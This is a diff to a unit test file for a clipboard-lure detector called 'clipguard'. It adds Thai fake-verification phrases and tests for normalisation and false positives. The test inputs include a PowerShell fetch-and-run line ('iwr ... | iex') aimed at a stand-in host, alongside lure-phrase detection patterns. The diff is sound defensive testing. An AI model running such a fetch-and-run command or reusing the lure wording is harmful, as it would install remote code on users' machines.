@@ -379,6 +379,13 @@ EXPECTED_SIGNAL = {
     "webdav-unc-wscript.txt": "script from a share at an address",
     "window-prefix-hid.txt": "hidden window",
     "zero-width-powershell.txt": "hidden window",
+    "lure-thai-robot-tail.txt": "fake-verification comment",
+    "lure-thai-recaptcha-label.txt": "fake-verification comment",
+    "lure-thai-not-a-bot.txt": "fake-verification comment",
+    "lure-thai-human-sara-am.txt": "fake-verification comment",
+    "lure-thai-human-sara-am-decomposed.txt": "fake-verification comment",
+    "lure-thai-unusual-traffic.txt": "fake-verification comment",
+    "lure-thai-connection-check.txt": "fake-verification comment",
 }
 ALL_SIGNALS = {
     "encoded command", "inline mshta script", "remote HTML application", "remote installer package",
@@ -437,6 +444,47 @@ class TestWhatTheSecondReadingFound(unittest.TestCase):
         for tail in ("# verify you are human", "# Verification ID: 12", "# not a robot", "# press enter"):
             match = clipguard.classify(f'powershell -c "iwr https://example.invalid/x | iex" {tail}')
             self.assertEqual(match.tier, WARNING, tail)
+
+    def test_each_thai_phrase_counts_on_its_own_and_the_words_it_was_built_against_do_not(self):
+        """Thai writes no spaces between words, so each alternative is a
+        substring: the phrase must fire alone, and the bare words that honest
+        Thai developer comments use must not."""
+        line = 'powershell -c "iwr https://example.invalid/x | iex" # '
+        for phrase in clipguard._THAI_LURE_PHRASES:
+            for joiner in ("", " ", "\u200b"):
+                tail = joiner.join(phrase)
+                with self.subTest(tail=tail):
+                    self.assertEqual(clipguard.classify(line + tail).tier, WARNING)
+        for honest in ("ยืนยัน", "ตรวจสอบ", "หุ่นยนต์", "บอท", "แชทบอท", "มนุษย์", "อ่านได้โดยมนุษย์",
+                       "โปรแกรมอัตโนมัติ", "เปิดโปรแกรมอัตโนมัติ", "ยืนยันตัวตน", "สําเร็จ", "ส\u0e33เร็จ",
+                       "กด Enter", "ตรวจสอบความปลอดภัย", "ความปลอดภัย", "ยืนยันว่าเซิร์ฟเวอร์ขึ้นแล้ว",
+                       "ขั้นตอนการยืนยัน", "การยืนยันส\u0e33เร็จ", "แคปช่า"):
+            with self.subTest(honest=honest):
+                self.assertEqual(clipguard.classify(line + honest).tier, NOTICE,
+                                 "a fetch-and-run line stays a notice under an honest Thai comment")
+
+    def test_the_thai_alternatives_are_in_the_form_normalize_leaves_text_in(self):
+        """NFKC splits SARA AM (U+0E33) into NIKHAHIT + SARA AA. A pattern
+        literal typed with it would never match normalized text; the helper
+        folds the pattern the same way, so a phrase with sara am matches both
+        spellings, and the compiled rule holds no U+0E33 to drift back in."""
+        import re
+        import unicodedata
+        self.assertNotIn("\u0e33", clipguard._LURE_COMMENT.pattern)
+        for phrase in clipguard._THAI_LURE_PHRASES:
+            for part in phrase:
+                self.assertEqual(part, unicodedata.normalize("NFKC", part), part)
+        folded = re.compile(clipguard._thai_alternatives([("ก\u0e33", "ลัง")]))
+        for spelling in ("ก\u0e33ลัง", "ก\u0e4d\u0e32ลัง"):
+            self.assertIsNotNone(folded.search(clipguard.normalize(spelling)), ascii(spelling))
+        self.assertIsNone(re.compile("ก\u0e33ลัง").search(clipguard.normalize("ก\u0e33ลัง")),
+                          "the trap the helper exists for")
+
+    def test_a_thai_comment_alone_is_not_a_warning(self):
+        """The comment rule is a dressing, as in English: it counts only on a
+        command that already fetches and runs."""
+        self.assertIsNone(clipguard.classify("echo hello # ฉันไม่ใช่หุ่นยนต์"))
+        self.assertIsNone(clipguard.classify("curl -I https://example.com # ยืนยันว่าคุณเป็นมนุษย์"))
 
     def test_a_launcher_inside_a_url_is_a_path(self):
         self.assertIsNone(clipguard.classify(
